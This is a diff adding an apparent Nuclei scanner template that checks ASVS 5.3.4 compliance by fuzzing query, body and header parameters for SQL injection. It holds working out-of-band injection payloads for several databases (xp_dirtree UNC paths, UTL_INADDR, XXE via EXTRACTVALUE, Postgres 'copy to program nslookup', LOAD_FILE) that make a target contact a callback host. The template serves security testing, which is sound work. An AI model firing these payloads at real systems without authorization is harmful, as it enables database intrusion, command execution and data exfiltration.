@@ -1,0 +1,50 @@
+http:
+- fuzzing:
+  - fuzz:
+    - ''' UNION {{sqli}}'
+    - '" UNION {{sqli}}'
+    - ''' AND 1={{sqli}}'
+    - '" AND 1={{sqli}}'
+    - ' {{sqli}}'
+    mode: single
+    parts:
+    - query
+    - body
+    - header
+    type: postfix
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  payloads:
+    sqli:
+    - SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE
+      root [ <!ENTITY % remote SYSTEM "{{interactsh-url}}"> %remote;]>'),'/l') FROM
+      dual--
+    - SELECT UTL_INADDR.get_host_address('{{interactsh-url}}')--
+    - '''; exec master..xp_dirtree ''//{{interactsh-url}}/a''--'
+    - copy (SELECT '') to program 'nslookup {{interactsh-url}}'--
+    - LOAD_FILE('\\{{interactsh-url}}\a')-- -
+    - "SELECT ... INTO OUTFILE '\\\\{{interactsh-url}}\a'-- -"
+  pre-condition:
+  - dsl:
+    - method != "OPTIONS"
+    type: dsl
+  stop-at-first-match: true
+id: ASVS-4-0-3-V5-3-4
+info:
+  author: AmirHossein Raeisi,snoopy
+  classification:
+    cwe-id: CWE-918
+  description: 'Verify that data selection or database queries (e.g. SQL, HQL, ORM,
+    NoSQL) use parameterized queries, ORMs, entity frameworks, or are otherwise protected
+    from database injection attacks.
+
+    '
+  name: ASVS 5.3.4 Check
+  reference:
+  - https://portswigger.net/web-security/sql-injection/cheat-sheet
+  severity: critical
+  tags: asvs,5.3.4
